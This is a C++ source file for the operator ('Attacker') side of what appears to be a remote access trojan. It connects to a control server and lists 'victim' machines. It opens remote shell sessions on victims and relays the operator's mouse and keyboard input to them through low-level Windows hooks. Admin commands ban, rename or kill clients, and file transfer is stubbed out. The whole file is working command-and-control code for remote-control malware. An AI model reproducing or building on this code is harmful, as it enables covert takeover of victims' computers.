#include "attacker.hpp"
#include "../commands.hpp"
#include <sstream>
#include <SFML/Window.hpp>

Attacker* Attacker::attacker = nullptr;

Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
	:
	myHId(inHId),
	tui(inTui)
{
	attacker = this;

	receiveTcpThread = new std::thread([this]() {
		while (true)
			receiveTcp();
		});

	auto priv = sf::IpAddress::getLocalAddress().value_or(sf::IpAddress::Any).toString();
	auto publ = sf::IpAddress::getPublicAddress().value_or(sf::IpAddress::Any).toString();
	tui.setTitle(" " + myHId + " - " + priv + " / " + publ);

	mouseTimer.start();
	pingTimer.start();

	std::thread([] {
		auto m = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
		auto k = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		UnhookWindowsHookEx(m);
		UnhookWindowsHookEx(k);
	}).detach();
}

int Attacker::update()
{
	sf::Clock clock;

	if (pingTimer.getElapsedTime() > sf::seconds(3)) {
		pingTimer.restart();

		if (isInitialized) {
			sf::Packet p;
			p << uint16_t(0) << uint8_t(Cmd::PING);
			auto _ = server.send(p);
		}
	}

	while (tui.server_commands.size() > 0) {
		std::string line = tui.server_commands.front();
		tui.server_commands.pop();

		tui.printServerShell(" > " + line + "\n");

		if (!handleCmd(line))
			return 1;
	}
	while (tui.ssh_commands.size() > 0) {
		if (isSshActive) {
			std::string line = tui.ssh_commands.front();
			tui.ssh_commands.pop();

			//tui.printSshShell(" > " + line + "\n");

			std::stringstream ss(line);
			std::string cmd;
			ss >> cmd;
			//exit ssh session
			if (cmd == "exit") {
				sf::Packet req;
				req << uint16_t(0) << uint8_t(Cmd::END_SSH);
				auto _ = server.send(req);

				isSshActive = false;
				isSendingMouse = false;
				isSendingKeyboard = false;
				tui.setIsSendingMouse(isSendingMouse);
				tui.setIsSendingKeyboard(isSendingKeyboard);

				tui.ssh_commands = std::queue<std::string>();
				tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
				tui.printSshShell("\n \n");
			}
			//send ssh data
			else {
				sf::Packet req;
				req << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << line;
				auto _ = server.send(req);
			}
		}
		else {
			tui.ssh_commands = std::queue<std::string>();
			tui.printSshShell("ssh is not active\n");
		}
	}
	
	while (packetsToProcess.size() > 0) {
		handlePacket(packetsToProcess[0]);
		packetsToProcess.erase(packetsToProcess.begin());
	}

	//set fps limit
	auto passed = clock.getElapsedTime().asMicroseconds();
	if (passed < 1'000'000 / fps) 
		sf::sleep(sf::microseconds(1'000'000 / fps - passed));

	return 0;
}

void Attacker::receiveTcp()
{
	sf::Packet p;
	auto status = server.receive(p);

	//update initialization status
	if (status == sf::Socket::Status::Disconnected) {
		if (isInitialized) {
			isInitialized = false;
			isAdmin = false;

			isSshActive = false;
			isSendingMouse = false;
			isSendingKeyboard = false;

			tui.setIsSendingMouse(isSendingMouse);
			tui.setIsSendingKeyboard(isSendingKeyboard);
			tui.setClientsOutput("Server connection required");
			tui.setDatabaseOutput("Server connection and admin privileges required");
			tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
			tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
		}
		sf::sleep(sf::milliseconds(100));
	}
	if (status == sf::Socket::Status::Error)
		sf::sleep(sf::milliseconds(100));
	if (status != sf::Socket::Status::Done)
		return;

	uint16_t reqId;
	p >> reqId;

	if (reqId == uint16_t(0))
		packetsToProcess.push_back(p);
	else
		responsesToProcess[reqId] = p;
}

void Attacker::connectServer(bool pw, std::string ipStr, short port)
{
	isInitialized = false;
	isAdmin = false;

	isSshActive = false;
	isSendingMouse = false;
	isSendingKeyboard = false;
	server.disconnect();

	tui.setIsSendingMouse(isSendingMouse);
	tui.setIsSendingKeyboard(isSendingKeyboard);
	tui.setClientsOutput("Server connection required");
	tui.setDatabaseOutput("Server connection and admin privileges required");
	tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
	tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));

	//retrieve the ip and port from the interface string
	//if no port is provided, default to 443
	if (ipStr.find_first_of(':') != std::string::npos) {
		auto pos = ipStr.find_first_of(':');
		try {
			port = std::stoi(ipStr.substr(pos + 1));
		}
		catch (const std::invalid_argument&) {
			tui.printServerShell("port provided is not valid\n");
			return;
		}
		ipStr = ipStr.substr(0, pos);
	}

	//parse the ip address
	auto ip = sf::IpAddress::resolve(ipStr);
	if (!ip.has_value()) {
		tui.printServerShell("ip address provided is not valid\n");
		return;
	}
	serverIp = ip.value();

	//connect to the server
	if (server.connect(serverIp, port) != sf::Socket::Status::Done) {
		tui.printServerShell("failed to connect to server\n");
		return;
	}

	//take password input from the user (if admin)
	std::string password = "";
	if (pw) {
		tui.printServerShell("enter the password: ");
		while (true) {
			if (tui.server_commands.size() < 1) {
				sf::sleep(sf::milliseconds(100));
				continue;
			}

			password = tui.server_commands.front();
			tui.server_commands.pop();
			tui.printServerShell(std::string(password.size(), '*') + "\n");
			break;
		}
	}

	//send the registration request
	sf::Packet req;
	uint16_t reqId = requestId++;
	auto cmd = (pw) ? Cmd::REGISTER_ADMIN : Cmd::REGISTER_ATTACKER;
	req << reqId << std::uint8_t(cmd) << std::string("#v0.0.1#") << myHId;
	if (pw)
		req << password;
	if (server.send(req) != sf::Socket::Status::Done) {
		tui.printServerShell("failed to send registration request\n");

		server.disconnect();
		return;
	}

	//wait for initialization response and output progress
	tui.printServerShell("waiting for response: [");
	for (int i = 0; i < 10; i++) {
		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			sf::sleep(sf::milliseconds(500));
			tui.printServerShell("*");
		}
		else
			tui.printServerShell(".");
	}
	tui.printServerShell("] - ");

	//initialization wasn't successful
	if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
		tui.printServerShell("timed out\n");

		server.disconnect();
		return;
	}
	
	sf::Packet res = responsesToProcess[reqId];
	responsesToProcess.erase(reqId);

	bool success = false;
	res >> success;
	if (!success) {
		if (pw)
			tui.printServerShell("failed admin login\n");
		else
			tui.printServerShell("you are banned :(\n");

		server.disconnect();
		return;
	}

	res >> myId;
	isInitialized = true;
	isAdmin = pw;

	std::string add = server.getRemoteAddress().value().toString() + ":" + std::to_string(server.getRemotePort());
	tui.setInfoTitle(ftxui::text("Connected to " + add) | ftxui::color(ftxui::Color::Green));

	if (pw)
		tui.printServerShell("admin access granted (" + std::to_string(myId) + ")\n");
	else
		tui.printServerShell("initialized (" + std::to_string(myId) + ")\n");
}

bool Attacker::handleCmd(const std::string& s)
{
	std::vector<std::string> param;
	std::string current;
	bool inQuotes = false;
	for (size_t i = 0; i < s.size(); ++i) {
		char c = s[i];

		if (c == '"') {
			inQuotes = !inQuotes;
			if (!current.empty()) {
				param.push_back(current);
				current.clear();
			}
			continue;
		}

		if (std::isspace(c) && !inQuotes) {
			if (!current.empty()) {
				param.push_back(current);
				current.clear();
			}
		}
		else {
			current += c;
		}
	}

	if (!current.empty())
		param.push_back(current);

	if (param.empty())
		return true;

	//TODO: add help command
	//TODO: add server confirm to more cmds

	std::string cmd = param[0];
	param.erase(param.begin());

	if (cmd == "help") {
		if (param.size() != 0) {
			tui.printServerShell("incorrect number of arguments entered\n");
			return true;
		}

		tui.printServerShell("help command is not available yet\n");
	}
	else if (cmd == "exit") {
		if (param.size() != 0)
			tui.printServerShell("incorrect number of arguments entered\n");
		else
			return false;
	}
	else if (cmd == "clear") {
		if (param.size() != 0)
			tui.printServerShell("incorrect number of arguments entered\n");
		else
			tui.clearServerShell();
	}
	
	//with server confirm
	else if ((cmd == "connect") || (cmd == "adminconnect")) {
		if (param.size() == 1)
			connectServer(cmd == "adminconnect", param[0], 443);
		else if (param.size() == 2) {
			short port = 0;
			try {
				port = std::stoul(param[1]);
			}
			catch (std::exception& e) {
				tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
				return true;
			}

			connectServer(cmd == "adminconnect", param[0], port);
		}
		else
			tui.printServerShell("incorrect number of arguments entered\n");
	}
	else if (cmd == "name") {
		if (param.size() != 2) {
			tui.printServerShell("incorrect number of arguments entered\n");
			return true;
		}
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			return true;
		}
		if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			return true;
		}

		//param[0] = hId, param[1] = name
		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::CHANGE_NAME) << param[0] << param[1];
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");
	}
	else if (cmd == "ban") {
		if (param.size() != 1) {
			tui.printServerShell("incorrect number of arguments entered\n");
			return true;
		}
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			return true;
		}
		if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			return true;
		}

		//param[0] = hId
		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::BAN_HID) << param[0];
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");
	}
	else if (cmd == "unban") {
		if (param.size() != 1) {
			tui.printServerShell("incorrect number of arguments entered\n");
			return true;
		}
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			return true;
		}
		if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			return true;
		}

		//param[0] = hId
		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::UNBAN_HID) << param[0];
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");
	}
	//with server confirm
	else if (cmd == "save") {
		if (param.size() != 0) {
			tui.printServerShell("incorrect number of arguments entered\n");
			return true;
		}
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			return true;
		}
		if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			return true;
		}

		sf::Packet req;
		uint16_t reqId = requestId++;
		req << uint16_t(reqId) << uint8_t(Cmd::SAVE_DATASET);
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");

		tui.printServerShell("waiting for response: [");
		for (int i = 0; i < 10; i++) {
			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
				tui.printServerShell("*");
				sf::sleep(sf::milliseconds(500));
			}
			else
				tui.printServerShell(".");
		}
		tui.printServerShell("] - ");

		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			tui.printServerShell("request timed out\n");
			return true;
		}
		else
			tui.printServerShell("saved database\n");
	}
	else if (cmd == "kill") {
		if (param.size() != 1) {
			tui.printServerShell("incorrect number of arguments entered\n");
			return true;
		}
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			return true;
		}
		if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			return true;
		}

		uint16_t oId = uint16_t(0);
		try {
			oId = std::stoul(param[0]);
		}
		catch (std::exception& e) {
			tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
			return true;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::KILL) << oId;
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");
	}
	//with server confirm
	else if (cmd == "ssh") {
		if (param.size() != 1) {
			tui.printServerShell("incorrect number of arguments entered\n");
			return true;
		}
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			return true;
		}

		uint16_t oId = uint16_t(0);
		try {
			oId = std::stoul(param[0]);
		}
		catch (std::exception& e) {
			tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
			return true;
		}

		sf::Packet req;
		uint16_t reqId = requestId++;
		req << uint16_t(reqId) << uint8_t(Cmd::START_SSH) << oId;
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");

		tui.printServerShell("waiting for response: [");
		for (int i = 0; i < 10; i++) {
			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
				tui.printServerShell("*");
				sf::sleep(sf::milliseconds(500));
			}
			else
				tui.printServerShell(".");
		}
		tui.printServerShell("] - ");

		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			tui.printServerShell("timed out\n");
			return true;
		}

		sf::Packet res = responsesToProcess[reqId];
		responsesToProcess.erase(reqId);

		//1 = success, 2 = already paired, 3 = invalid id
		//4 = other id already paired
		uint8_t code = 0;
		res >> code;
		if (code == 1) {
			isSshActive = true;

			tui.clearSshShell();
			tui.setSshTitle(ftxui::text("SSH (" + std::to_string(oId) + ")") | ftxui::color(ftxui::Color::Green));
			tui.printServerShell("loading ssh session...\n");
		}
		else if (code == 2)
			tui.printServerShell("ssh session already active\n");
		else if (code == 3)
			tui.printServerShell("invalid victim id\n");
		else if (code == 4)
			tui.printServerShell("victim occupied\n");
		else
			tui.printServerShell("unknown error\n");
	}
	
	else if (cmd == "togglemouse") {
		if (param.size() != 0)
			tui.printServerShell("incorrect number of arguments entered\n");
		else if (!isSshActive)
			tui.printServerShell("ssh must be active\n");
		else {
			isSendingMouse = !isSendingMouse;
			tui.setIsSendingMouse(isSendingMouse);
		}
	}
	else if (cmd == "togglekeyboard") {
		if (param.size() != 0)
			tui.printServerShell("incorrect number of arguments entered\n");
		else if (!isSshActive)
			tui.printServerShell("ssh must be active\n");
		else {
			isSendingKeyboard = !isSendingKeyboard;
			tui.setIsSendingKeyboard(isSendingKeyboard);
		}
	}
	else if (cmd == "sendfile") {
		if (param.size() != 2)
			tui.printServerShell("incorrect number of arguments entered\n");
		else if (!isSshActive)
			tui.printServerShell("ssh must be active\n");
		else {

		}
	}
	else if (cmd == "getfile") {
		if (param.size() != 2)
			tui.printServerShell("incorrect number of arguments entered\n");
		else if (!isSshActive)
			tui.printServerShell("ssh must be active\n");
		else {

		}
	}
	else
		tui.printServerShell("command entered is not valid\n");

	return true;
}

void Attacker::handlePacket(sf::Packet& p)
{	
	uint8_t cmd;
	p >> cmd;

	if (cmd == uint8_t(Cmd::CLIENTS_UPDATE))
		updateList(p);
	else if (cmd == uint8_t(Cmd::END_SSH)) {
		isSshActive = false;
		isSendingMouse = false;
		isSendingKeyboard = false;

		tui.setIsSendingMouse(isSendingMouse);
		tui.setIsSendingKeyboard(isSendingKeyboard);
		tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
	}
	else if (cmd == uint8_t(Cmd::SSH_DATA)) {
		if (!isSshActive)
			return;

		std::string data;
		p >> data;

		tui.printSshShell(data);
	}
}

void Attacker::updateList(sf::Packet& p)
{
	uint16_t dbSize, clientsSize;

	p >> dbSize;
	//database is only sent to admins
	if (dbSize > 0 || isAdmin) {
		std::stringstream ss_database("");
		for (int i = 0; i < dbSize; i++) {
			std::string oHId = "", name = "";
			bool ban = false;
			p >> oHId >> name >> ban;
			ss_database << "- " << oHId << " (" << name << "): ";
			if (ban)
				ss_database << "banned\n";
			else
				ss_database << "not banned\n";
		}
		tui.setDatabaseOutput(ss_database.str());
	}
	else if (isInitialized)
		tui.setDatabaseOutput("Admin privileges required");

	p >> clientsSize;
	std::stringstream ss_clients("");
	for (int i = 0; i < clientsSize; i++) {
		std::string oHId = "", ip = "";
		uint16_t id = 0;
		bool att = false, adm = false;
		p >> oHId >> ip >> id >> att >> adm;

		ss_clients << "- " << oHId << " (" << id << "): ";
		if (adm)
			ss_clients << "admin - " << ip;
		else if (att)
			ss_clients << "attacker - " << ip;
		else
			ss_clients << "victim - " << ip;

		ss_clients << "\n";
	}
	tui.setClientsOutput(ss_clients.str());
}

LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && attacker->isSendingMouse &&
		!sf::Keyboard::isKeyPressed(sf::Keyboard::Key::Insert))
	{
		sf::Packet p;
		sf::Socket::Status _;

		MSLLHOOKSTRUCT* par = (MSLLHOOKSTRUCT*)lParam;
		switch (wParam)
		{
		case WM_LBUTTONDOWN:
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_PRESS) << uint8_t(1);
			_ = attacker->server.send(p);

			break;
		case WM_LBUTTONUP:
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_RELEASE) << uint8_t(1);
			_ = attacker->server.send(p);

			break;
		case WM_RBUTTONDOWN:
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_PRESS) << uint8_t(2);
			_ = attacker->server.send(p);

			break;
		case WM_RBUTTONUP:
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_RELEASE) << uint8_t(2);
			_ = attacker->server.send(p);

			break;
		case WM_MBUTTONDOWN:
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_PRESS) << uint8_t(3);
			_ = attacker->server.send(p);

			break;
		case WM_MBUTTONUP:
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_RELEASE) << uint8_t(3);
			_ = attacker->server.send(p);

			break;
		case WM_XBUTTONDOWN: {
			int which = HIWORD(par->mouseData);
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_PRESS) << uint8_t(3 + which);
			_ = attacker->server.send(p);

			break;
		}
		case WM_XBUTTONUP: {
			int which = GET_WHEEL_DELTA_WPARAM(par->mouseData);
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_RELEASE) << uint8_t(3 + which);
			_ = attacker->server.send(p);

			break;
		}
		case WM_MOUSEWHEEL: {
			int delta = HIWORD(par->mouseData);
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_SCROLL) << int16_t(delta);
			_ = attacker->server.send(p);

			break;
		}
		case WM_MOUSEMOVE: {
			if (attacker->mouseTimer.getElapsedTime().asMilliseconds() < 65)
				break;

			auto size = sf::Vector2f(sf::VideoMode::getDesktopMode().size);
			auto pos = sf::Vector2f(sf::Mouse::getPosition()).componentWiseDiv(size);

			int x = std::round(std::min(std::max(pos.x, 0.f), 1.f) * (UINT16_MAX - 1));
			int y = std::round(std::min(std::max(pos.y, 0.f), 1.f) * (UINT16_MAX - 1));

			sf::Packet p;
			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_POS) << uint16_t(x) << uint16_t(y);
			auto _ = attacker->server.send(p);
			attacker->mouseTimer.restart();
			break;
		}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK Attacker::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && attacker->isSendingKeyboard &&
		!sf::Keyboard::isKeyPressed(sf::Keyboard::Key::Insert))
	{
		sf::Packet p;
		KBDLLHOOKSTRUCT* par = (KBDLLHOOKSTRUCT*)lParam;
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			if (par->vkCode != 45) {
				p << uint16_t(0) << uint8_t(Cmd::SSH_KEYBOARD_PRESS) << uint8_t(par->vkCode);
				auto _ = attacker->server.send(p);
			}
		}
		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
			p << uint16_t(0) << uint8_t(Cmd::SSH_KEYBOARD_RELEASE) << uint8_t(par->vkCode);
			auto _ = attacker->server.send(p);
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
